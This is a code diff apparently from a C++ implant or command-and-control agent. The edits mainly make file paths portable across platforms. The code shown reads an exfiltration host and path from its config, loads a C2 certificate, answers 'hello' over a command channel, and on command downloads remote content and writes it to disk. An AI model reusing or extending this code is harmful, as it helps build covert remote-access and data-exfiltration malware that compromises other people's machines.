@@ -8,9 +8,7 @@
 #include "HttpClient.hpp"
 #include "HttpUtils.hpp"
 #include "Processes.hpp"
-#ifndef _WIN32
-    #include "Shims.hpp"
-#endif
+#include "Environment.hpp"
 #include <thread>
 #include <fstream>
 
@@ -95,7 +93,7 @@ unique_ptr<ISocket> SocketFactory(string scheme, string host)
 
 void MainThread(unsigned int parentThreadId)
 {
-    string configPath = Processes::GetExecutablePath() + "\\config.json";
+    string configPath = Processes::GetExecutablePath() + Legit::SEPARATOR + "config.json";
     json config;
     ifstream configFile(configPath, ios::in);
     configFile >> config;
@@ -114,7 +112,7 @@ void MainThread(unsigned int parentThreadId)
     string exfilHost = exfilUrlParts[1];
     string exfilPath = exfilUrlParts[2];
 
-    string certPath = Processes::GetExecutablePath() + "\\cc.cer";
+    string certPath = Processes::GetExecutablePath() + Legit::SEPARATOR + "cc.cer";
     vector<char> pemBytes;
     DataLoader::LoadFromFile(Utils::WideFromString(certPath), pemBytes);
     string cert(pemBytes.begin(), pemBytes.end());
@@ -172,7 +170,8 @@ void MainThread(unsigned int parentThreadId)
 
             auto response = client.Get(urlParts[2]);
             
-            DataLoader::DumpToFile(L"c:\\lib\\test.bin", response.body);
+            string path = Processes::GetExecutablePath() + Legit::SEPARATOR + "test.bin";
+            DataLoader::DumpToFile(Utils::WideFromString(path), response.body);
         }
         else if (message == "hello")
             cc->Send("hello");
